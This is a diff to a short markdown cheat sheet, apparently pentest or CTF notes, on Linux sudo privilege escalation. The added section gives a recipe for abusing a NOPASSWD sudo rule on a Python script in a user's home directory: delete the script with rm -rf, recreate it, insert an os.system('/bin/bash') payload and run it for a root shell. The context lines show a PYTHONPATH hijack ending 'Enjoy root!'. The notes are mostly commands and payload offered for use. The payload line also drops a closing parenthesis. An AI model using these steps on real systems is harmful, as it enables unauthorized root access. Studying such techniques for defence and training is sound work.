@@ -19,3 +19,17 @@
 #### 6) sudo PYTHONPATH/tmp/ /usr/bin/python /home/whatever/script.py
 
 #### 7) Enjoy root!
+
+# SUDO PRIVILEGE ESCALATION
+
+#### 1) NOPASSWD: /usr/bin/python /home/USER/script.py
+
+#### 2) If the python script is under the current user's home directory, we can remove the script and create the new one with the same name.
+
+#### rm -rf /home/USER/script.py
+
+#### touch /home/USER/script.py
+
+#### 3) Insert payload (import os;os.system('/bin/bash')
+
+#### 4) GGEZ
